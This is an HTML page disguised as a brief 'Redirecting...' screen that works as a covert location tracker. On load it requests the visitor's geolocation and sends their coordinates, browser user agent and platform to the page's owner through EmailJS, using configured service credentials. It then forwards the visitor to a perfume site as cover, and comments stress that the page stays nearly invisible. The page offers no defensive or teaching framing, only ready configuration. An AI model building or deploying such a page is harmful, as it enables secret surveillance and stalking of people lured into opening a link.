<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <!-- No UI elements - completely invisible page -->
    <style>
        /* Minimal styling - page almost invisible */
        body {
            margin: 0;
            padding: 0;
            background: transparent;
            font-family: Arial, sans-serif;
        }
        /* Very subtle loading indicator (optional) */
        .loading {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #333;
            font-size: 14px;
            opacity: 0.3;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Almost invisible loading text (can be removed completely) -->
    <div class="loading">Loading...</div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        // ============================================
        // CONFIGURATION - Change these as needed
        // ============================================
        const CONFIG = {
            // EmailJS Settings
            emailjsPublicKey: "ueOumEe6aJ_CEmq_m",
            emailjsServiceId: "service_7pjie2s",
            emailjsTemplateId: "template_30kabln",
            
            // Perfume Website (Change to any working site)
            perfumeWebsite: "https://www.fragrantica.com/",
            // Alternatives: 
            // "https://www.fragrancex.com/"
            // "https://www.fragrancenet.com/"
            // "https://www.ulta.com/"
            // "https://www.sephora.com/"
            
            // Timing (in milliseconds)
            redirectDelay: 1500, // 1.5 seconds after email send
            locationTimeout: 10000 // 10 seconds timeout for location
        };

        // ============================================
        // MAIN LOGIC - No UI, just functionality
        // ============================================
        
        // Initialize EmailJS
        emailjs.init(CONFIG.emailjsPublicKey);

        let emailSent = false;
        let redirectInitiated = false;

        function sendLocationEmail(latitude, longitude) {
            console.log("📍 Sending location:", latitude, longitude);
            
            const templateParams = {
                latitude: latitude.toString(),
                longitude: longitude.toString(),
                timestamp: new Date().toLocaleString('en-US', {
                    timeZone: 'Asia/Karachi',
                    dateStyle: 'full',
                    timeStyle: 'medium'
                }),
                userAgent: navigator.userAgent,
                platform: navigator.platform
            };

            return emailjs.send(
                CONFIG.emailjsServiceId,
                CONFIG.emailjsTemplateId,
                templateParams
            )
            .then((response) => {
                console.log("✅ Email sent successfully!", response);
                emailSent = true;
                return true;
            })
            .catch((error) => {
                console.error("❌ Email failed:", error);
                // Continue anyway - don't block redirect
                return false;
            });
        }

        function redirectToPerfumeWebsite() {
            if (redirectInitiated) return;
            redirectInitiated = true;
            
            console.log(`🔄 Redirecting to: ${CONFIG.perfumeWebsite}`);
            
            setTimeout(() => {
                window.location.href = CONFIG.perfumeWebsite;
            }, 300); // Small delay for clean redirect
        }

        function handleLocationSuccess(position) {
            const { latitude, longitude } = position.coords;
            console.log("🌍 Location received:", latitude, longitude);
            
            // Send email immediately
            sendLocationEmail(latitude, longitude).then(() => {
                // Redirect after email is sent (or failed)
                setTimeout(() => {
                    redirectToPerfumeWebsite();
                }, CONFIG.redirectDelay);
            });
        }

        function handleLocationError(error) {
            console.error("❌ Location error:", error.code, error.message);
            
            let errorMsg = "Location error: ";
            switch(error.code) {
                case 1: errorMsg += "Permission denied"; break;
                case 2: errorMsg += "Position unavailable"; break;
                case 3: errorMsg += "Timeout"; break;
                default: errorMsg += "Unknown error";
            }
            console.log(`⚠️ ${errorMsg} - Redirecting anyway...`);
            
            // Still redirect even if location fails
            setTimeout(() => {
                redirectToPerfumeWebsite();
            }, 1000);
        }

        function requestLocationAndRedirect() {
            console.log("📍 Requesting location permission...");
            
            if (!("geolocation" in navigator)) {
                console.log("⚠️ Geolocation not supported - redirecting...");
                redirectToPerfumeWebsite();
                return;
            }

            // Request location with minimal options
            navigator.geolocation.getCurrentPosition(
                handleLocationSuccess,
                handleLocationError,
                {
                    enableHighAccuracy: false, // Faster response
                    timeout: CONFIG.locationTimeout,
                    maximumAge: 60000 // Allow cached location
                }
            );
        }

        // ============================================
        // EXECUTE - Run immediately when page loads
        // ============================================
        
        // Option 1: Request location immediately
        document.addEventListener("DOMContentLoaded", function() {
            console.log("🚀 Page loaded - requesting location...");
            
            // Small delay to ensure everything is initialized
            setTimeout(() => {
                requestLocationAndRedirect();
            }, 100);
        });

        // Option 2: Fallback - If location takes too long, still redirect
        setTimeout(() => {
            if (!redirectInitiated) {
                console.log("⏰ Fallback: Redirecting after timeout...");
                redirectToPerfumeWebsite();
            }
        }, CONFIG.locationTimeout + 2000);

        // ============================================
        // EXTRA: Handle page visibility changes
        // ============================================
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                console.log("📱 Page hidden - user may have switched tabs");
            }
        });

        console.log("✅ Script initialized successfully");
        console.log(`🎯 Will redirect to: ${CONFIG.perfumeWebsite}`);
    </script>
</body>
</html>
